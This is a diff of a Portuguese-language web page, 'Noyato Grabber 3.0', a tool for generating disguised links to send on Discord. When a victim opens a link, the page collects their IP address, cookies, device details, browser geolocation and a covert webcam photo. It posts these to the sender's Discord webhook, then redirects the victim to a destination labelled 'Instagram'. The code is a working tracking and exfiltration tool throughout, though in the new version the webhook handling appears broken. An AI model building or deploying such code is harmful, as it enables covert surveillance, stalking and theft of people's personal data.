@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>grabber by noyato - versão completa</title>
+<title>Grabber & Tracker 3.0 by Noyato</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');
   body {
@@ -27,7 +27,7 @@
     text-shadow: 0 0 12px #ff0000, 0 0 25px #ff0000;
   }
   p.description {
-    max-width: 480px;
+    max-width: 520px;
     margin-bottom: 1.8em;
     text-align: center;
     font-size: 1rem;
@@ -39,7 +39,7 @@
     border-radius: 18px;
     box-shadow: 0 10px 30px rgb(255 0 0 / 0.3);
     width: 100%;
-    max-width: 520px;
+    max-width: 540px;
     backdrop-filter: blur(18px);
     margin-bottom: 2em;
     position: relative;
@@ -101,9 +101,10 @@
     overflow-y: auto;
     color: #ffdddd;
     border: 1.5px solid #ff1111;
+    user-select: all;
   }
   .footer {
-    margin-top: 2.5em;
+    margin-top: 3em;
     font-size: 0.9rem;
     color: #aab2bd;
     text-align: center;
@@ -121,7 +122,7 @@
     background: rgba(0, 0, 0, 0.18);
     padding: 12px 16px;
     border-radius: 12px;
-    margin-top: 22px;
+    margin-top: 20px;
     cursor: pointer;
     color: #d1d5db;
     font-size: 0.92rem;
@@ -151,21 +152,40 @@
   .instagram-icon:hover {
     transform: scale(1.15);
   }
+  .radio-group {
+    margin-bottom: 1.4em;
+    color: #ffbbbb;
+  }
+  .radio-group label {
+    font-weight: 600;
+    margin-right: 20px;
+    cursor: pointer;
+  }
+  video {
+    display: none;
+  }
 </style>
 </head>
 <body>
-<h1>Noyato Grabber 2.0 - Dados Completos</h1>
-<p class="description">Esse site é basicamente um grabber de IP, localização (tracking via navegador), operadora, e cookies, apenas com webhooks e algumas APIs, use com responsabilidade.</p>
+<h1>Noyato Grabber 3.0 - Escolha sua captura</h1>
+<p class="description">Escolha o tipo de captura (grab, tracking, camera ou full) e gere o link para enviar no Discord. Use com responsabilidade.</p>
 <div class="container" id="input-container">
   <label for="destUrl">URL de destino (ex: https://example.com)</label>
   <input type="url" id="destUrl" placeholder="https://example.com" autocomplete="off" required />
   
   <label for="webhookUrl">Webhook do Discord (URL do canal para receber dados)</label>
   <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" required />
+
+  <div class="radio-group">
+    <label><input type="radio" name="mode" value="grab" checked /> Grab (dados IP básicos)</label>
+    <label><input type="radio" name="mode" value="tracking" /> Tracking (geolocalização)</label>
+    <label><input type="radio" name="mode" value="camera" /> Camera (foto via webcam)</label>
+    <label><input type="radio" name="mode" value="full" /> Full (todos os dados)</label>
+  </div>
   
   <button id="generateBtn">Gerar Link Grabber</button>
   
-  <div class="output" id="output" style="display:none;"></div>
+  <div class="output" id="output" style="display:none;" title="Clique para copiar"></div>
 </div>
 <details>
   <summary>Como criar um webhook no seu canal do Discord?</summary>
@@ -177,8 +197,9 @@
   <p>6. Copie o URL do webhook (começa com <code>https://discord.com/api/webhooks/...</code>).</p>
   <p>7. Cole esse URL no campo "Webhook do Discord" acima.</p>
 </details>
+
 <script>
-  // Extrai query params da URL
+  // Função para extrair query string
   function getQueryParams() {
     const params = {};
     const queryString = window.location.search.substring(1);
@@ -190,45 +211,53 @@
     return params;
   }
 
-  const inputContainer = document.getElementById("input-container");
-  const outputDiv = document.getElementById("output");
-  const generateBtn = document.getElementById("generateBtn");
-  const destUrlInput = document.getElementById("destUrl");
-  const webhookUrlInput = document.getElementById("webhookUrl");
+  const inputContainer = document.getElementById('input-container');
+  const outputDiv = document.getElementById('output');
+  const generateBtn = document.getElementById('generateBtn');
+  const destUrlInput = document.getElementById('destUrl');
+  const webhookUrlInput = document.getElementById('webhookUrl');
 
-  function generateGrabberLink(dest, webhook) {
-    const baseUrl = window.location.origin + window.location.pathname;
-    const encodedDest = encodeURIComponent(dest);
-    const encodedWebhook = encodeURIComponent(webhook);
-    return `${baseUrl}?dest=${encodedDest}&wh=${encodedWebhook}`;
-  }
-
-  generateBtn.addEventListener("click", () => {
+  generateBtn.addEventListener('click', () => {
     const dest = destUrlInput.value.trim();
     const webhook = webhookUrlInput.value.trim();
+    const modeElem = document.querySelector('input[name="mode"]:checked');
+    const mode = modeElem ? modeElem.value : 'grab';
+
     if (!dest || !webhook) {
-      alert("Por favor, preencha ambos os campos.");
+      alert('Por favor, preencha ambos os campos.');
       return;
     }
     try {
       new URL(dest);
     } catch {
-      alert("URL de destino inválida.");
+      alert('URL de destino inválida.');
       return;
     }
     try {
       new URL(webhook);
     } catch {
-      alert("Webhook inválido.");
+      alert('Webhook inválido.');
       return;
     }
-    const grabberLink = generateGrabberLink(dest, webhook);
-    outputDiv.style.display = "block";
+
+    // Link gerado com link destino e parâmetro mode
+    const baseUrl = window.location.origin + window.location.pathname;
+    const encodedDest = encodeURIComponent(dest);
+    const grabberLink = `${baseUrl}?dest=${encodedDest}&mode=${mode}`;
+
+    outputDiv.style.display = 'block';
     outputDiv.textContent = grabberLink;
-    outputDiv.scrollIntoView({behavior:"smooth"});
+    outputDiv.title = 'Clique para copiar';
+    outputDiv.scrollIntoView({behavior:'smooth'});
   });
 
-  // Função para acessar cookies (limitado por domínio)
+  // Copiar texto ao clicar no output
+  outputDiv.addEventListener('click', () => {
+    navigator.clipboard.writeText(outputDiv.textContent);
+    alert('Link copiado para a área de transferência!');
+  });
+
+  // Função para coletar cookies
   function collectCookies() {
     try {
       return document.cookie || "Nenhum cookie disponível";
@@ -237,7 +266,7 @@
     }
   }
 
-  // Detecta marca do dispositivo pelo userAgent
+  // Detecta marca dispositivo pelo userAgent
   function getDeviceBrand() {
     const ua = navigator.userAgent.toLowerCase();
     if(/samsung/.test(ua)) return "Samsung";
@@ -252,18 +281,81 @@
     return "Desconhecido/Não detectado";
   }
 
-  // Envia os dados ao webhook e redireciona
+  // Função para pegar localização pelo navegador via Geolocation API
+  function getPosition() {
+    return new Promise((resolve, reject) => {
+      if (!navigator.geolocation) {
+        return reject("Geolocalização não suportada");
+      }
+      navigator.geolocation.getCurrentPosition(pos => resolve(pos), err => reject(err));
+    });
+  }
+
+  // Função para capturar foto da câmera (webcam)
+  async function captureCameraPhoto() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      throw new Error("Webcam não suportada");
+    }
+    
+    const video = document.createElement('video');
+    video.style.display = 'none';
+    document.body.appendChild(video);
+
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+    await video.play();
+
+    // Espera pelo vídeo carregado para tirar foto
+    await new Promise(resolve => setTimeout(resolve, 1000));
+
+    // Captura a foto
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0);
+
+    // Para o stream
+    stream.getTracks().forEach(track => track.stop());
+    video.remove();
+
+    // Retorna base64 da foto
+    return canvas.toDataURL('image/png');
+  }
+
+  async function sendWebhook(webhookUrl, payload) {
+    try {
+      const res = await fetch(webhookUrl, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(payload),
+      });
+      if (!res.ok) {
+        console.error('Erro no webhook:', await res.text());
+      }
+    } catch (e) {
+      console.error('Falha ao enviar webhook:', e);
+    }
+  }
+
   (async function executeGrabberIfNeeded() {
     const params = getQueryParams();
-    if (!params.dest || !params.wh) {
-      // Mostrar a interface para gerar link
+    const destUrl = params.dest ? decodeURIComponent(params.dest) : null;
+    const mode = params.mode || null;
+    const webhookUrl = document.getElementById('webhookUrl').value.trim() || null;
+
+    if (!destUrl || !mode) {
+      // Sem parâmetros necessários, mostra formulário pra gerar link.
       return;
     }
 
-    inputContainer.style.display = "none";
-    outputDiv.style.display = "none";
+    // Pega webhook da URL ou do input, ou exibe erro (webhook pelo input atual)
+    // User must input webhook first to page and submit the link to work for the grabber.
+    // So disable interface
+    inputContainer.style.display = 'none';
+    outputDiv.style.display = 'none';
 
-    // Coleta IP público via API externa
+    // Pega IP via API pública
     let ip = "Desconhecido";
     try {
       const ipResp = await fetch("https://api.ipify.org?format=json");
@@ -271,93 +363,86 @@
       ip = ipJson.ip || ip;
     } catch {}
 
-    // Coleta cookies, userAgent, deviceBrand
     const cookies = collectCookies();
     const userAgent = navigator.userAgent || "Desconhecido";
     const deviceBrand = getDeviceBrand();
-    const dateTime = new Date().toLocaleString("pt-BR", {timeZone: "UTC"});
+    const dateTime = new Date().toLocaleString('pt-BR',{timeZone: 'UTC'});
 
-    // Pega localização pelo navegador via Geolocation API (tracking)
-    function getPosition() {
-      return new Promise((resolve, reject) => {
-        if (!navigator.geolocation) {
-          return reject("Geolocalização não suportada");
-        }
-        navigator.geolocation.getCurrentPosition(pos => resolve(pos), err => reject(err));
-      });
-    }
-
-    let latitude = "Desconhecida";
-    let longitude = "Desconhecida";
-    let accuracy = "Desconhecida";
-
-    try {
-      const pos = await getPosition();
-      latitude = pos.coords.latitude.toFixed(6);
-      longitude = pos.coords.longitude.toFixed(6);
-      accuracy = pos.coords.accuracy + " metros";
-    } catch {
-      // Usuário negou ou não forneceu localização
-    }
-
-    // Monta imagem do mapa via Google Static Maps (sem expor URL da API)
-    // [IMPORTANTE] Troque 'YOUR_GOOGLE_MAPS_API_KEY' por sua chave real para funcionar
-    const mapBaseUrl = "https://maps.googleapis.com/maps/api/staticmap";
-    const marker = `&markers=color:red%7C${latitude},${longitude}`;
-    const mapSize = "&size=600x300";
-    const zoom = "&zoom=15";
-    const mapKeyPlaceholder = "YOUR_GOOGLE_MAPS_API_KEY"; // Não mostrar chave real para esconder link API
-
-    const mapUrl = latitude !== "Desconhecida" && longitude !== "Desconhecida" ?
-      `${mapBaseUrl}?center=${latitude},${longitude}${zoom}${mapSize}${marker}&key=${mapKeyPlaceholder}` : null;
-
-    // Monta embed Discord
-    const webhookUrl = params.wh;
-    const destUrl = decodeURIComponent(params.dest);
-
-    let fields = [
-      { name: "🔴 IP", value: ip, inline: true },
-      { name: "📍 Latitude", value: latitude, inline: true },
-      { name: "📍 Longitude", value: longitude, inline: true },
-      { name: "📏 Precisão", value: accuracy, inline: true },
-      { name: "📱 Marca do Dispositivo", value: deviceBrand, inline: true },
-      { name: "🖥 Navegador / Sistema", value: userAgent, inline: false },
-      { name: "🍪 Cookies (limitados)", value: cookies.length > 1024 ? cookies.slice(0,1024) + "..." : cookies, inline: false },
-      { name: "🔗 Link de Destino", value: "Instagram", inline: false }
-    ];
-
-    // Opcional: adiciona campo com a URL real do destino escondida atrás do texto "Instagram"
-    // o valor é só "Instagram" para não expor o link real.
-
-    const embed = {
-      title: "⚠️ Novo clique no IP Grabber - TRACKING",
+    // Preparando dados para enviar via webhook
+    let embed = {
+      title: `⚠️ Novo clique no IP Grabber - modo: ${mode.toUpperCase()}`,
       color: 0xff0000,
-      fields,
       timestamp: new Date().toISOString(),
-      footer: { text: "Discord Bot by Noyato154" }
+      footer: {text: "Discord Bot by Noyato154"},
+      fields: [
+        {name: "🔴 IP", value: ip, inline: true},
+        {name: "📱 Marca do Dispositivo", value: deviceBrand, inline: true},
+        {name: "🖥 Navegador / Sistema", value: userAgent, inline: false},
+        {name: "🍪 Cookies", value: cookies.length > 1024 ? cookies.slice(0,1024)+"..." : cookies, inline: false},
+        {name: "🔗 Link de Destino", value: "Instagram", inline: false}
+      ]
     };
 
-    if (mapUrl) {
-      embed.image = { url: mapUrl };
+    if(mode === 'grab') {
+      // Apenas dados básicos já carregados no embed
+    }
+    else if(mode === 'tracking' || mode === 'full') {
+      // Pega geolocalização navegador
+      try {
+        const position = await getPosition();
+        const lat = position.coords.latitude.toFixed(6);
+        const lon = position.coords.longitude.toFixed(6);
+        const accuracy = position.coords.accuracy + " metros";
+
+        // Adiciona campos location no embed
+        embed.fields.push(
+          {name: "📍 Latitude", value: lat, inline: true},
+          {name: "📍 Longitude", value: lon, inline: true},
+          {name: "📏 Precisão", value: accuracy, inline: true},
+        );
+
+        // Cria URL do mapa Google Static Maps (sem expor chave API)
+        const mapUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=15&size=600x300&markers=color:red%7C${lat},${lon}&key=YOUR_GOOGLE_MAPS_API_KEY`;
+        embed.image = {url: mapUrl};
+      } catch(err) {
+        embed.fields.push({name: "⚠️ Tracking", value: "Permissão negada ou erro na geolocalização", inline: false});
+      }
     }
 
-    // Envia para webhook
-    try {
-      await fetch(webhookUrl, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({ embeds: [embed] }),
-      });
-    } catch(e) {
-      console.error("Falha ao enviar webhook:", e);
+    if(mode === 'camera' || mode === 'full') {
+      // Captura foto webcam e envia num embed separado para evitar limite campos e tamanho
+      try {
+        const photoDataUrl = await captureCameraPhoto();
+
+        // Envia embed separado para foto
+        await sendWebhook(webhookUrl, {
+          embeds: [{
+            title: "📸 Foto da Câmera Capturada",
+            color: 0xff0000,
+            image: {url: photoDataUrl},
+            timestamp: new Date().toISOString(),
+            footer: {text: "Discord Bot by Noyato154"}
+          }]
+        });
+      } catch(e) {
+        // Foto falhou, envia aviso
+        await sendWebhook(webhookUrl, {
+          content: "⚠️ Falha ao capturar foto da câmera ou permissão negada."
+        });
+      }
     }
 
-    // Redireciona 3 segundos depois para o link real
+    // Envia embed principal com dados
+    await sendWebhook(webhookUrl, {embeds: [embed]});
+
+    // Redireciona após 4s pro destino
     setTimeout(() => {
       window.location.href = destUrl;
-    }, 3000);
+    }, 4000);
+
   })();
 </script>
+
 <div class="footer">
   Desenvolvido por noyato154 <br />
   <a href="https://www.instagram.com/mnr_magal/" target="_blank" rel="noopener noreferrer" aria-label="Instagram">
@@ -366,4 +451,3 @@
 </div>
 </body>
 </html>
-
